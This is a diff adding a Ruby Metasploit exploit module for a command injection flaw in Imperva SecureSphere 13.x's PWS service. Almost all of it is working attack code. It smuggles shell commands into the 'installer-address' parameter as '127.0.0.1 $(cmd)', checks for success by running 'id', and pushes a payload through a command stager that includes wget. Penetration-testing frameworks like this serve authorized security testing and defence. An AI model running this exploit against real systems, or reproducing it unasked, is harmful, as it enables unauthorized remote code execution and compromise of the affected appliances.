@@ -1,0 +1,143 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'Imperva SecureSphere PWS Command Injection',
+        'Description'    => %q(
+          This module exploits a command injection vulnerability in Imperva
+          SecureSphere 13.x. The vulnerability exists in the PWS service,
+          where Python CGIs didn't properly sanitize user supplied command
+          parameters and directly passes them to corresponding CLI utility,
+          leading to command injection. Agent registration credential is
+          required to exploit SecureSphere in gateway mode.
+
+          This module was successfully tested on Imperva SecureSphere 13.0/13.1/
+          13.2 in pre-ftl mode and unsealed gateway mode.
+        ),
+        'License'        => MSF_LICENSE,
+        'Author'         =>
+          [
+            'rsp3ar <lukunming<at>gmail.com>' # Discovery/Metasploit Module
+          ],
+        'References'     =>
+          [
+            [ 'EDB', '45542' ]
+          ],
+        'DisclosureDate'  => "Oct 8 2018",
+        'DefaultOptions' => {
+          'SSL' => true,
+          'PrependFork' => true,
+        },
+        'Platform'        => 'linux',
+        'Arch'            => [ARCH_X86, ARCH_X64],
+        'CmdStagerFlavor' => %w{ echo printf wget },
+        'Targets'         =>
+          [
+            ['Imperva SecureSphere 13.0/13.1/13.2', {}]
+          ],
+        'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptString.new('USERNAME', [false, 'Agent registration username', 'imperva']),
+        OptString.new('PASSWORD', [false, 'Agent registration password', '']),
+        OptString.new('TARGETURI', [false, 'The URI path to impcli', '/pws/impcli']),
+        OptInt.new('TIMEOUT', [false, 'HTTP connection timeout', 15])
+      ])
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false])
+    ]
+  end
+
+  def check
+    begin
+      res = execute_command('id')
+    rescue => e
+      vprint_error("#{e}")
+      return CheckCode::Unknown
+    end
+
+    if res.body =~ /uid=\d+/
+      return CheckCode::Vulnerable
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    unless CheckCode::Vulnerable == check
+      unless datastore['ForceExploit']
+        fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.')
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    print_status("Sending payload #{datastore['PAYLOAD']}")
+    execute_cmdstager
+  end
+
+  def execute_command(cmd, opts = {})
+    data = {
+      'command'     => 'impctl server status',
+      'parameters'  => {
+        'broadcast'         => true,
+        'installer-address' => "127.0.0.1 $(#{cmd})"
+      }
+    }
+
+    res = send_request data
+
+    return unless res
+
+    if res.code == 401
+      fail_with(Failure::NoAccess, 'Authorization Failure, valid agent registration credential is required')
+    end
+
+    unless res.code == 406 && res.body.include?("impctl")
+      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+    end
+
+    res
+  end
+
+  def send_request(data)
+    req_params = {
+      'method'      => 'POST',
+      'uri'         => normalize_uri(target_uri.path),
+      'data'        => data.to_json
+    }
+
+    if !datastore['USERNAME'].blank? && !datastore['PASSWORD'].blank?
+      unless @cookie
+        res = send_request_cgi({
+          'method'      => 'GET',
+          'uri'         => normalize_uri('/')
+        })
+        unless res
+          fail_with(Failure::Unreachable, "#{peer} - Connection failed")
+        end
+
+        @cookie = res.get_cookies
+      end
+
+      req_params['cookie'] = @cookie
+      req_params['headers'] = {
+        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+      }
+    end
+
+    send_request_cgi(req_params, datastore['TIMEOUT'])
+  end
+end
